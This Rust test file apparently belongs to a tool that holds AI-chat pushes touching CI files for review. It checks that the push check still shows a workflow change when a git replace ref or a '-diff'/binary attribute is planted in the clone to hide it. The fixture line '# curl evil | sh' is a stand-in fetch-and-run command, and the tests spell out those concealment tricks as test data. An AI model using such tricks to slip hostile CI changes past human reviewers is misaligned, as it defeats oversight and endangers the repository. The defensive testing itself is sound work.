// Copyright 2026 Purlis
// SPDX-License-Identifier: Apache-2.0

//! **The tree diff that decides a CI-file push is read by git as the app asks it, never as the
//! chat's clone says** (ADR 0128 D8.3). A chat writes the clone it works in, so a replace ref, an
//! attribute and a pipeline's own YAML are all things it can plant: none may hide a change.

use std::path::Path;

use purlis_core::forge::Kind;
use purlis_core::heldact::{GitTrees, PushCheck, Trees, check_push};
use purlis_core::mergehold::HeadSha;

use crate::support::git;

const WORKFLOW: &str = ".github/workflows/ci.yml";

fn write(root: &Path, file: &str, text: &str) {
    let at = root.join(file);
    std::fs::create_dir_all(at.parent().unwrap()).unwrap();
    std::fs::write(at, text).unwrap();
}

fn sha(root: &Path, rev: &str) -> HeadSha {
    let out = git(root, &["rev-parse", rev]);
    HeadSha::try_from(String::from_utf8(out.stdout).unwrap().trim()).unwrap()
}

/// A clone with `main` (a workflow) and `evil`, whose tip changes the workflow.
fn clone() -> (tempfile::TempDir, std::path::PathBuf, HeadSha, HeadSha) {
    let dir = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(dir.path()).unwrap();
    git(&root, &["init", "-q", "-b", "main", "."]);
    write(&root, WORKFLOW, "name: ci\non: push\n");
    write(&root, "README.md", "x\n");
    git(&root, &["add", "-A"]);
    git(&root, &["commit", "-q", "-m", "main"]);
    git(&root, &["checkout", "-q", "-b", "evil"]);
    write(&root, WORKFLOW, "name: ci\non: push\n# curl evil | sh\n");
    git(&root, &["add", "-A"]);
    git(&root, &["commit", "-q", "-m", "evil"]);
    git(&root, &["checkout", "-q", "main"]);
    let (base, tip) = (sha(&root, "main"), sha(&root, "evil"));
    (dir, root, base, tip)
}

#[test]
fn a_replace_ref_in_the_clone_does_not_make_the_diff_empty() {
    purlis_core::unsteered!();
    let (_dir, root, base, tip) = clone();
    // `refs/replace/<tip>` makes git read the base wherever it is asked for the tip.
    git(&root, &["replace", tip.as_str(), base.as_str()]);
    let plain = git(
        &root,
        &[
            "--no-replace-objects",
            "diff-tree",
            "-r",
            "--name-only",
            base.as_str(),
            tip.as_str(),
        ],
    );
    assert!(
        String::from_utf8(plain.stdout).unwrap().contains("ci.yml"),
        "the real commits differ"
    );
    let PushCheck::Hold(diff) = check_push(
        Kind::GitHub,
        None,
        &GitTrees::of_trusted_store(&root),
        &base,
        &tip,
    ) else {
        panic!("held: a replace ref hides nothing");
    };
    assert!(diff.diff.contains("+# curl evil | sh"));
}

#[test]
fn a_no_diff_attribute_in_the_clone_does_not_turn_the_change_into_binary_files_differ() {
    purlis_core::unsteered!();
    let (_dir, root, base, tip) = clone();
    write(
        &root,
        ".git/info/attributes",
        ".github/workflows/* -diff\n*.yml binary\n",
    );
    let PushCheck::Hold(diff) = check_push(
        Kind::GitHub,
        None,
        &GitTrees::of_trusted_store(&root),
        &base,
        &tip,
    ) else {
        panic!("held");
    };
    assert!(
        diff.diff.contains("+# curl evil | sh"),
        "the lines are shown: {}",
        diff.diff
    );
    assert!(!diff.diff.contains("Binary files"));
}

/// A tree that says what a binary patch says, as a git that would not show lines does.
struct Binary;

impl Trees for Binary {
    fn changed(&self, _: &HeadSha, _: &HeadSha) -> Result<Vec<String>, String> {
        Ok(vec![WORKFLOW.to_owned()])
    }

    fn patch(&self, _: &HeadSha, _: &HeadSha, _: &[String]) -> Result<String, String> {
        Ok("diff --git a/x b/x\nBinary files a/x and b/x differ\n".to_owned())
    }

    fn files(&self, _: &HeadSha) -> Result<Vec<String>, String> {
        Ok(Vec::new())
    }

    fn read(&self, _: &HeadSha, _: &str) -> Result<Option<String>, String> {
        Ok(None)
    }
}

#[test]
fn a_patch_git_says_is_binary_is_refused_not_held() {
    purlis_core::unsteered!();
    let (a, b) = (
        HeadSha::try_from("a".repeat(40)).unwrap(),
        HeadSha::try_from("b".repeat(40)).unwrap(),
    );
    let PushCheck::Refuse(why) = check_push(Kind::GitHub, None, &Binary, &a, &b) else {
        panic!("refused")
    };
    assert!(why.contains("binary"), "{why}");
}

#[test]
fn the_files_beside_the_workflows_that_decide_what_runs_are_ci_files_too() {
    purlis_core::unsteered!();
    for file in [
        ".github/actions/setup/action.yml",
        ".github/dependabot.yml",
        "renovate.json",
        ".github/CODEOWNERS",
        "CODEOWNERS",
    ] {
        let (_dir, root, base, _) = clone();
        git(&root, &["checkout", "-q", "-b", "other", "main"]);
        write(&root, file, "x: 1\n");
        git(&root, &["add", "-A"]);
        git(&root, &["commit", "-q", "-m", "other"]);
        let tip = sha(&root, "HEAD");
        let PushCheck::Hold(diff) = check_push(
            Kind::GitHub,
            None,
            &GitTrees::of_trusted_store(&root),
            &base,
            &tip,
        ) else {
            panic!("{file} is held");
        };
        assert_eq!(diff.files, vec![file.to_owned()]);
    }
}
